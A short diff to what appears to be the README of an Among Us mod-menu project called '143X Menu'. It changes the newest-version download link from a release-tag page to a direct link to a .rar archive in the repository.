@@ -2,7 +2,7 @@
 
 # 143X Menu
 
-# [NEWEST VERSION HERE](https://github.com/DXXTHLY/amongusmodmenu/releases/tag/ammupdate)
+# [NEWEST VERSION HERE](https://github.com/DXXTHLY/amongusmodmenu/blob/main/143X.rar)
 
 ## 📺 Preview
 
